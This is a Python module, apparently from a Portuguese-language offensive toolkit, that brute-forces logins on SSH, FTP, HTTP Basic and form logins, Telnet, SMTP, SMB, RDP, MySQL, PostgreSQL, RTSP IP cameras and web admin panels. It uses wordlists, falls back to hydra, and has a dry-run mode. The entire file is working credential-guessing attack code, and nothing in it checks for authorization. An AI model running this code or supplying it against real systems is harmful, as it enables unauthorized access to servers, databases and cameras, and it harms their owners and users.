#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Força bruta de credenciais — usa wordlists próprias e hydra quando disponível.

import base64
import ftplib
import hashlib
import smtplib
import socket
import time
import urllib.request
import urllib.error

from core import utils

try:
    import requests
except Exception:
    requests = None

try:
    import paramiko
except Exception:
    paramiko = None


def _extras(ctx):
    """Posicionais e flags vindos da CLI (parse central em core.utils)."""
    return utils.parse_extras(ctx.get("extras"))


def _porta(ctx, padrao):
    """Retorna (porta, n_posicionais_consumidos_pela_porta).

    `--port 2222` e a forma recomendada; um primeiro posicional todo
    numerico tambem vale (compatibilidade) e e consumido aqui, para que
    as wordlists NUNCA sejam confundidas com a porta.
    """
    pos, flags = _extras(ctx)
    if "port" in flags:
        try:
            return int(flags["port"]), 0
        except ValueError:
            pass
    if pos and pos[0].isdigit():
        return int(pos[0]), 1
    return padrao, 0


def _listas(ctx, consumir=0):
    """Carrega wordlists de usuários e senhas (flags > posicionais > config)."""
    cfg = ctx["config"]
    pos, flags = _extras(ctx)
    resto = pos[consumir:] if consumir else list(pos)
    w_users = (flags.get("users") or flags.get("wordlist-users")
               or (resto[0] if resto else None)
               or cfg.get("wordlist_users", "wordlists/users.txt"))
    w_pwds = (flags.get("pass") or flags.get("wordlist-pass")
              or (resto[1] if len(resto) > 1 else None)
              or cfg.get("wordlist_passwords", "wordlists/passwords.txt"))
    users = utils.ler_lista(w_users)
    pwds = utils.ler_lista(w_pwds)
    if not users:
        users = ["admin"]
    if not pwds:
        pwds = ["admin"]
    return users, pwds


def _loop(modulo, alvo, ctx, tentar, consumir=0):
    """Motor genérico de tentativas com delay, dry-run e log."""
    users, pwds = _listas(ctx, consumir)
    total = len(users) * len(pwds)
    if utils.is_dry(ctx):
        utils.mostrar_dry(modulo, "{} combinacoes contra {}".format(total, alvo))
        return None
    atraso = ctx["config"].get("bruteforce_delay", 1)
    n = 0
    print("  {} usuarios x {} senhas = {} tentativas".format(len(users), len(pwds), total))
    for u in users:
        for p in pwds:
            n += 1
            try:
                ok = tentar(u, p)
            except Exception:
                ok = False
            if ok:
                print(utils.c("  [+] SUCESSO: {}:{}".format(u, p), utils.VERDE))
                utils.log(modulo, alvo, "sucesso {}:{}".format(u, utils.mascarar(p)))
                return (u, p)
            print("    [{}/n] {}:{}".format(n, u, p))
            time.sleep(atraso)
    print(utils.c("  Wordlist esgotada — nenhuma credencial valida.", utils.AMARELO))
    utils.log(modulo, alvo, "wordlist esgotada ({} tentativas)".format(n))
    return None


def _hydra(alvo, servico, porta, modulo, ctx=None, consumir=0):
    """Fallback hydra quando a lib Python nativa nao existe."""
    if ctx is None:
        ctx = {"extras": [], "config": utils.carregar_config()}
    if utils.is_dry(ctx):
        users, pwds = _listas(ctx, consumir)
        utils.mostrar_dry(modulo, "{} combinacoes via hydra ({}://{}:{})".format(
            len(users) * len(pwds), servico, alvo, porta))
        return
    if not utils.exigir_ferramenta("hydra"):
        return
    users, pwds = _listas(ctx, consumir)
    # Wordlists temporarios fora do repositorio (nunca no ./logs)
    import tempfile
    arq_u = arq_p = None
    try:
        with tempfile.NamedTemporaryFile("w", suffix="_u.txt", delete=False) as f:
            f.write("\n".join(users))
            arq_u = f.name
        with tempfile.NamedTemporaryFile("w", suffix="_p.txt", delete=False) as f:
            f.write("\n".join(pwds))
            arq_p = f.name
        cmd = ["hydra", "-L", arq_u, "-P", arq_p, "-s", str(porta), "-V", "-f",
               "{}://{}".format(servico, alvo)]
        print("  Executando: " + " ".join(cmd))
        import subprocess
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
            print((out.stdout or "") + (out.stderr or ""))
            utils.log(modulo, alvo, "hydra concluido")
        except Exception as e:
            print(utils.c("  Erro hydra: {}".format(e), utils.VERMELHO))
    finally:
        import os as _os
        for arq in (arq_u, arq_p):
            if arq:
                try:
                    _os.unlink(arq)
                except Exception:
                    pass


def ssh(alvo, ctx):
    """SSH Brute Force (paramiko, hydra como fallback)."""
    porta, consumir = _porta(ctx, 22)
    if utils.is_dry(ctx):
        users, pwds = _listas(ctx, consumir)
        utils.mostrar_dry("ssh", "{}:{} com {} combinacoes".format(alvo, porta, len(users) * len(pwds)))
        return
    if paramiko is None:
        print(utils.c("  paramiko ausente — usando hydra.", utils.AMARELO))
        _hydra(alvo, "ssh", porta, "ssh", ctx, consumir)
        return

    def tentar(u, p):
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            cli.connect(alvo, port=porta, username=u, password=p,
                        timeout=10, banner_timeout=10, auth_timeout=10)
            cli.close()
            return True
        except Exception:
            return False

    _loop("ssh", alvo, ctx, tentar, consumir)


def ftp(alvo, ctx):
    """FTP Brute Force (ftplib)."""
    porta, consumir = _porta(ctx, 21)

    def tentar(u, p):
        f = ftplib.FTP()
        try:
            f.connect(alvo, porta, timeout=10)
            f.login(u, p)
            f.quit()
            return True
        except Exception:
            try:
                f.close()
            except Exception:
                pass
            return False

    _loop("ftp", alvo, ctx, tentar, consumir)


def http_basic(alvo, ctx):
    """HTTP Basic Auth Brute Force."""

    def tentar(u, p):
        req = urllib.request.Request(alvo)
        cred = base64.b64encode("{}:{}".format(u, p).encode()).decode()
        req.add_header("Authorization", "Basic " + cred)
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.status == 200
        except urllib.error.HTTPError:
            return False
        except Exception:
            return False

    _loop("http_basic", alvo, ctx, tentar)


def http_form(alvo, ctx):
    """HTTP Form Login Brute Force (POST).

    Posicionais = nome dos campos (usuario, senha). Wordlists vem de
    --users/--pass ou do config.json.
    """
    pos, flags = _extras(ctx)
    consumir = min(len(pos), 2)
    campo_u = flags.get("user-field") or (pos[0] if len(pos) > 0 else None)
    campo_p = flags.get("pass-field") or (pos[1] if len(pos) > 1 else None)
    if utils.is_dry(ctx):
        users, pwds = _listas(ctx, consumir)
        utils.mostrar_dry("http_form", "{} combinacoes contra {}".format(len(users) * len(pwds), alvo))
        return
    if requests is None:
        if utils.instalar_dependencia("requests"):
            globals()["requests"] = __import__("requests")
        else:
            print(utils.c("  Modulo 'requests' indisponivel — http_form cancelado.", utils.VERMELHO))
            return
    if campo_u is None:
        campo_u = utils.perguntar("Campo do usuario", "username")
    if campo_p is None:
        campo_p = utils.perguntar("Campo da senha", "password")

    # Baseline com credencial invalida para comparar tamanhos de resposta
    def tamanho(u, p):
        try:
            r = requests.post(alvo, data={campo_u: u, campo_p: p}, timeout=10, allow_redirects=True)
            return len(r.text), r.status_code, r.url
        except Exception:
            return -1, 0, ""

    base_len, _, _ = tamanho("fsataque_baseline", "fsataque_invalida")

    def tentar(u, p):
        tam, status, url = tamanho(u, p)
        if tam < 0:
            return False
        # Sucesso = redirecionou ou corpo muito diferente do baseline
        if status in (301, 302, 303, 307, 308):
            return True
        if base_len > 0 and abs(tam - base_len) > max(80, int(base_len * 0.15)):
            return True
        return False

    _loop("http_form", alvo, ctx, tentar, consumir)


def telnet(alvo, ctx):
    """Telnet Brute Force (socket puro, sem telnetlib)."""
    porta, consumir = _porta(ctx, 23)

    def tentar(u, p):
        s = socket.socket()
        s.settimeout(8)
        try:
            s.connect((alvo, porta))
            banner = s.recv(1024)
            if b"login" not in banner.lower() and b"username" not in banner.lower():
                # alguns servidores mandam so o prompt depois
                banner += s.recv(1024)
            s.sendall(u.encode() + b"\n")
            s.recv(1024)
            s.sendall(p.encode() + b"\n")
            resp = s.recv(2048).lower()
            fracassos = (b"incorrect", b"denied", b"failed", b"invalid", b"wrong")
            if any(f in resp for f in fracassos):
                return False
            # shell prompt indicativo de sucesso
            return any(m in resp for m in (b"$", b"#", b"~", b">"))
        except Exception:
            return False
        finally:
            try:
                s.close()
            except Exception:
                pass

    _loop("telnet", alvo, ctx, tentar, consumir)


def smtp(alvo, ctx):
    """SMTP Brute Force (AUTH LOGIN)."""
    porta, consumir = _porta(ctx, 587)
    use_tls = porta == 465

    def tentar(u, p):
        servidor = None
        try:
            if use_tls:
                servidor = smtplib.SMTP_SSL(alvo, porta, timeout=10)
            else:
                servidor = smtplib.SMTP(alvo, porta, timeout=10)
                try:
                    servidor.starttls()
                except Exception:
                    pass
            servidor.login(u, p)
            servidor.quit()
            return True
        except Exception:
            if servidor:
                try:
                    servidor.quit()
                except Exception:
                    pass
            return False

    _loop("smtp", alvo, ctx, tentar, consumir)


def smb(alvo, ctx):
    """SMB Brute Force (hydra — limitado)."""
    porta, consumir = _porta(ctx, 445)
    _hydra(alvo, "smb", porta, "smb", ctx, consumir)


def rdp(alvo, ctx):
    """RDP Brute Force (hydra — limitado, sem GUI)."""
    porta, consumir = _porta(ctx, 3389)
    _hydra(alvo, "rdp", porta, "rdp", ctx, consumir)


def mysql(alvo, ctx):
    """MySQL Brute Force (pymysql, hydra como fallback)."""
    porta, consumir = _porta(ctx, 3306)
    try:
        import pymysql  # noqa
        def tentar(u, p):
            c = pymysql.connect(host=alvo, port=porta, user=u, password=p, connect_timeout=8)
            c.close()
            return True
        _loop("mysql", alvo, ctx, tentar, consumir)
    except ImportError:
        _hydra(alvo, "mysql", porta, "mysql", ctx, consumir)


def postgres(alvo, ctx):
    """PostgreSQL Brute Force (psycopg2, hydra como fallback)."""
    porta, consumir = _porta(ctx, 5432)
    try:
        import psycopg2  # noqa
        def tentar(u, p):
            c = psycopg2.connect(host=alvo, port=porta, user=u, password=p, connect_timeout=8)
            c.close()
            return True
        _loop("postgres", alvo, ctx, tentar, consumir)
    except ImportError:
        _hydra(alvo, "postgres", porta, "postgres", ctx, consumir)


def rtsp(alvo, ctx):
    """RTSP Brute Force (câmeras IP) via DESCRIBE com Basic/Digest."""
    porta, consumir = _porta(ctx, 554)

    def tentar(u, p):
        s = socket.socket()
        s.settimeout(8)
        try:
            s.connect((alvo, porta))
            s.recv(1024)
            cred = base64.b64encode("{}:{}".format(u, p).encode()).decode()
            req = ("DESCRIBE rtsp://{}:{}/ RTSP/1.0\r\nCSeq: 1\r\n"
                   "Authorization: Basic {}\r\n\r\n").format(alvo, porta, cred)
            s.sendall(req.encode())
            resp = s.recv(2048)
            if b"200 OK" in resp:
                return True
            if b"401" in resp and b"Digest" in resp:
                # Tenta digest simples com MD5
                import re
                m = re.search(rb'realm="([^"]+)".*?nonce="([^"]+)"', resp, re.S)
                if m:
                    realm, nonce = m.group(1).decode(), m.group(2).decode()
                    ha1 = hashlib.md5("{}:{}:{}".format(u, realm, p).encode()).hexdigest()
                    ha2 = hashlib.md5("DESCRIBE:rtsp://{}:{}/".format(alvo, porta).encode()).hexdigest()
                    respn = hashlib.md5("{}:{}:{}".format(ha1, nonce, ha2).encode()).hexdigest()
                    req2 = ("DESCRIBE rtsp://{}:{}/ RTSP/1.0\r\nCSeq: 2\r\n"
                            "Authorization: Digest username=\"{}\", realm=\"{}\", nonce=\"{}\", "
                            "uri=\"/\", response=\"{}\"\r\n\r\n").format(alvo, porta, u, realm, nonce, respn)
                    s.sendall(req2.encode())
                    return b"200 OK" in s.recv(2048)
            return False
        except Exception:
            return False
        finally:
            try:
                s.close()
            except Exception:
                pass

    _loop("rtsp", alvo, ctx, tentar, consumir)


def admin_panel(alvo, ctx):
    """Brute force genérico de painéis admin (HTTP Basic nos caminhos da wordlist)."""
    cfg = ctx["config"]
    caminhos = utils.ler_lista(cfg.get("wordlist_dirs", "wordlists/dirs.txt"))
    if utils.is_dry(ctx):
        utils.mostrar_dry("admin_panel", "{} caminhos x wordlist em {}".format(len(caminhos), alvo))
        return

    def tentar(u, p):
        for caminho in caminhos:
            url = alvo.rstrip("/") + "/" + caminho
            req = urllib.request.Request(url)
            cred = base64.b64encode("{}:{}".format(u, p).encode()).decode()
            req.add_header("Authorization", "Basic " + cred)
            try:
                with urllib.request.urlopen(req, timeout=8) as r:
                    if r.status == 200:
                        print(utils.c("  [+] Painel com acesso: {}".format(url), utils.VERDE))
                        return True
            except urllib.error.HTTPError:
                continue
            except Exception:
                continue
        return False

    _loop("admin_panel", alvo, ctx, tentar)
